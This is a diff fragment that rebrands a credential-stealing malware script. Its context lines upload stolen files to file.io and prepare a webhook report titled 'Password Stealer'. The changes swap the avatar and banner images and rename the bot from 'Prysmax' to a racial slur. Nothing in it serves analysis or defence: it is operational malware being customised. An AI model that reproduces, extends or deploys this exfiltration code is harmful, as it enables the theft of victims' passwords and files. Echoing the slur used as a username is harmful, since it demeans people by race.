@@ -322,8 +322,8 @@ def mainpass():
 
         response = requests.post("https://file.io", files=files, params=params).json()
         pay = {
-            "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
-            "username": "Prysmax",
+            "avatar_url": "https://th.bing.com/th/id/R.9f6a83e1abb85a6b4c198b2db82e6273?rik=oZXS24afu51S9g&pid=ImgRaw&r=0",
+            "username": "Negro",
             "embeds": [
                 {
                     "title": "Password Stealer",
@@ -340,7 +340,7 @@ def mainpass():
                         }
                     ],
                     "image": {
-                        "url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif",
+                        "url": "https://th.bing.com/th/id/R.9f6a83e1abb85a6b4c198b2db82e6273?rik=oZXS24afu51S9g&pid=ImgRaw&r=0",
                         "height": 0,
                         "width": 0
                     }
